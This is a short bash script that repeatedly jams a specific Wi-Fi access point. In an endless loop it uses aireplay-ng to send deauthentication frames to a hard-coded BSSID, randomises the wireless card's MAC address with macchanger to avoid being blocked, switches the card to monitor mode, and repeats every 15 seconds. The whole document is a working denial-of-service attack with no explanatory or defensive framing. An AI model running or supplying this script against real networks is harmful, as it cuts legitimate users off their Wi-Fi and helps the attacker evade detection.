#!/bin/bash

while true
do
	iwconfig wlan0 channel 6
	aireplay-ng -0 6 -a C4:A8:1D:3D:93:D5 wlan0
	ifconfig wlan0 down
	macchanger -r wlan0 | grep "New MAC"
	iwconfig wlan0 mode monitor
	ifconfig wlan0 up
	echo "Wait.. 15 sec"
	sleep 15
done

